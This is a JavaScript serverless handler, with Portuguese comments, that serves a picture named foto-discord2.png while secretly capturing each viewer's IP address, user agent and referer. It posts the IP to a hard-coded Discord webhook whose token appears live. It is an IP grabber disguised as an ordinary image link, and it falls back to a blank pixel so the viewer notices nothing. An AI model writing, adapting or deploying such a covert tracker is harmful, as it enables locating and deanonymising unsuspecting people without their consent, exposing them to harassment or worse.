import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
  // ========== CAPTURA IP CORRETAMENTE ==========
  const forwarded = req.headers['x-forwarded-for'];
  const realIp = req.headers['x-real-ip'];
  
  let ip = 'IP não detectado';
  
  if (forwarded) {
    // PEGA O PRIMEIRO IP (usuário real)
    const ips = forwarded.split(',').map(i => i.trim());
    ip = ips[0];
  } else if (realIp) {
    ip = realIp;
  } else {
    ip = req.connection?.remoteAddress || req.socket?.remoteAddress || 'IP não detectado';
  }
  
  // Remove "::ffff:" se tiver
  ip = ip.replace('::ffff:', '');
  
  console.log('══════════════════════════════════════════');
  console.log('🎯 foto-discord2.png ACESSADA');
  console.log('══════════════════════════════════════════');
  console.log('🌐 IP CAPTURADO:', ip);
  console.log('🔗 URL:', req.url);
  console.log('📅 Data:', new Date().toLocaleString('pt-BR'));
  console.log('👤 User-Agent:', req.headers['user-agent']?.substring(0, 80));
  console.log('📊 Referer:', req.headers['referer'] || 'Direto');
  console.log('══════════════════════════════════════════');
  
  // ========== DISCORD WEBHOOK ==========
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1456767774368993380/-412QnxkT_spPdRfKW2uuhMevQM23-v7XGR9yjOfz0ymAg7ooyJZ85kBILbzAEiaIZQ-';
  
  if (DISCORD_WEBHOOK.includes('discord.com')) {
    try {
      await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🎯 **foto-discord2.png**\n🌐 IP: \`${ip}\`\n🕐 ${new Date().toLocaleString('pt-BR')}\n🔗 ${req.url}`
        })
      });
      console.log('✅ Discord: Mensagem enviada');
    } catch (err) {
      console.log('❌ Discord Erro:', err.message);
    }
  }
  
  // ========== ENVIA A FOTO ==========
  try {
    // CAMINHO DA SUA FOTO
    const fotoPath = path.join(process.cwd(), 'public', 'foto-discord2.png');
    
    console.log('🔍 Buscando foto em:', fotoPath);
    
    if (!fs.existsSync(fotoPath)) {
      console.log('❌ ERRO: Arquivo não encontrado!');
      
      // Lista arquivos da pasta public
      const publicPath = path.join(process.cwd(), 'public');
      if (fs.existsSync(publicPath)) {
        const arquivos = fs.readdirSync(publicPath);
        console.log('📁 Arquivos em public/:', arquivos);
      }
      
      throw new Error('Arquivo não encontrado');
    }
    
    const fotoBuffer = fs.readFileSync(fotoPath);
    console.log('✅ Foto carregada. Tamanho:', fotoBuffer.length, 'bytes');
    
    // HEADERS IMPORTANTES
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', fotoBuffer.length);
    res.setHeader('Cache-Control', 'no-store, max-age=0');
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    res.send(fotoBuffer);
    console.log('✅ Foto enviada com sucesso!');
    
  } catch (error) {
    console.log('❌ ERRO FATAL:', error.message);
    
    // Fallback
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64'
    );
    
    res.setHeader('Content-Type', 'image/png');
    res.send(pixel);
  }
}
